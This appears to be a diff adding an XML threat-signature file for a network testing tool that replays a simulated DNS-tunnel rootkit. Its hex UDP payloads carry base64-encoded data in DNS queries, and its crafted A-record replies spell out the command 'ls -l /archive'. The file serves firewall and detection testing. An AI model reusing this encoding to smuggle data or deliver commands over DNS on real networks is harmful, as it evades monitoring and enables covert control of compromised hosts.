@@ -1,0 +1,161 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Sample of Data Smuggling and Arbitrary Command Execution Via DNS a Based Rootkit"/>
+    <EngDesc display="true" value="This threat simulates the use of a clandestine DNS channel using a custom DNS server and DNS recursion as a data transport, this data is a TLV structure which is base64 encoded swapping the &quot;/&quot; and &quot;-&quot; character to comply with various DNS RFCs (breaking various Base64 RFCs), in reply the rootkit is told to execute &quot;ls -l /archive&quot;. This threat uses the DNS service which typically listens on port 53."/>
+    <Intent display="true">
+      <item value="Evasion"/>
+      <item value="Tunneling"/>
+    </Intent>
+    <Protocol display="true" value="DNS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Firewall"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true"/>
+    <Known_Products_Affected display="true"/>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="http://www.stonedcoder.org/~phar/"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID value="0000010b69baccf100c000a80001003c79fdeca3" display="true"/>
+    <Revision value="1" display="true"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632835529221875000"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1148530118" display="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="A"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="M">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="N">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="O">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="P">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="Q">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="R">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="S">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="T">
+      <for index="A"/>
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <Output index="M" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <UDP srcPort="@random(1026,65535)" destPort="$destPort" checksum="" length="" Payload="12F0000000010000000000003A4151526C64476777416754417141494741775941554E6F624D6D594542502D2D2D774146424D436F417638474E323176626A70344F6A49364D6A3A706B59575674623234364C334E69615734364C324A706269396D5957787A5A5170685A47303665446F7A4F6A5136595752744F6939325958497601610B73746F6E6564636F646572036F72670000010001"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="O" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <UDP srcPort="@random(1026,65535)" destPort="$destPort" checksum="" length="" Payload="8984000000010000000000003A4151526C64476777416754417141494741775941554E6F624D6D594542502D2D2D774146424D436F417638474E323176626A70344F6A49364D6A3A706B59575674623234364C334E69615734364C324A706269396D5957787A5A5170685A47303665446F7A4F6A5136595752744F6939325958497601610B73746F6E6564636F646572036F72670000010001"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="Q" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <UDP srcPort="@random(1026,65535)" destPort="$destPort" checksum="" length="" Payload="78E4000000010000000000003A4151526C64476777416754417141494741775941554E6F624D6D594542502D2D2D774146424D436F417638474E323176626A70344F6A49364D6A3A706B59575674623234364C334E69615734364C324A706269396D5957787A5A5170685A47303665446F7A4F6A5136595752744F6939325958497601610B73746F6E6564636F646572036F72670000010001"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="S" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <UDP srcPort="@random(1026,65535)" destPort="$destPort" checksum="" length="" Payload="34D1000000010000000000003A4151526C64476777416754417141494741775941554E6F624D6D594542502D2D2D774146424D436F417638474E323176626A70344F6A49364D6A3A706B59575674623234364C334E69615734364C324A706269396D5957787A5A5170685A47303665446F7A4F6A5136595752744F6939325958497601610B73746F6E6564636F646572036F72670000010001"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1,3,5,7">
+    <Output index="N" Count="">
+      <Ethernet srcMac="$destMAC" destMac="$sourceMAC" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="11" HeaderChecksum="" srcIP="$destIP" destIP="$sourceIP" options="" CE="" DF="" MF="">
+          <UDP srcPort="53" destPort="" checksum="" length="" Payload="12F0840000010001000000003A4151526C64476777416754417141494741775941554E6F624D6D594542502D2D2D774146424D436F417638474E323176626A70344F6A49364D6A3A706B59575674623234364C334E69615734364C324A706269396D5957787A5A5170685A47303665446F7A4F6A5136595752744F6939325958497601610B73746F6E6564636F646572036F72670000010001C00C0001000100000000000401000000"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="P" Count="">
+      <Ethernet srcMac="$destMAC" destMac="$sourceMAC" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="11" HeaderChecksum="" srcIP="$destIP" destIP="$sourceIP" options="" CE="" DF="" MF="">
+          <UDP srcPort="53" destPort="" checksum="" length="" Payload="8984840000010001000000003A4151526C64476777416754417141494741775941554E6F624D6D594542502D2D2D774146424D436F417638474E323176626A70344F6A49364D6A3A706B59575674623234364C334E69615734364C324A706269396D5957787A5A5170685A47303665446F7A4F6A5136595752744F6939325958497601610B73746F6E6564636F646572036F72670000010001C00C0001000100000000000401000000"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="R" Count="">
+      <Ethernet srcMac="$destMAC" destMac="$sourceMAC" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="11" HeaderChecksum="" srcIP="$destIP" destIP="$sourceIP" options="" CE="" DF="" MF="">
+          <UDP srcPort="53" destPort="" checksum="" length="" Payload="78E4840000010005000000003A4151526C64476777416754417141494741775941554E6F624D6D594542502D2D2D774146424D436F417638474E323176626A70344F6A49364D6A3A706B59575674623234364C334E69615734364C324A706269396D5957787A5A5170685A47303665446F7A4F6A5136595752744F6939325958497601610B73746F6E6564636F646572036F72670000010001C00C0001000100000000000401FD0E00C00C000100010000000000046C73202DC00C000100010000000000046C202F61C00C0001000100000000000472636869C00C0001000100000000000476655C30"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="T" Count="">
+      <Ethernet srcMac="$destMAC" destMac="$sourceMAC" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="11" HeaderChecksum="" srcIP="$destIP" destIP="$sourceIP" options="" CE="" DF="" MF="">
+          <UDP srcPort="53" destPort="" checksum="" length="" Payload="34D1840000010002000000003A4151526C64476777416754417141494741775941554E6F624D6D594542502D2D2D774146424D436F417638474E323176626A70344F6A49364D6A3A706B59575674623234364C334E69615734364C324A706269396D5957787A5A5170685A47303665446F7A4F6A5136595752744F6939325958497601610B73746F6E6564636F646572036F72670000010001C00C0001000100000000000400FF0400C00C0001000100000000000407B342A9"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
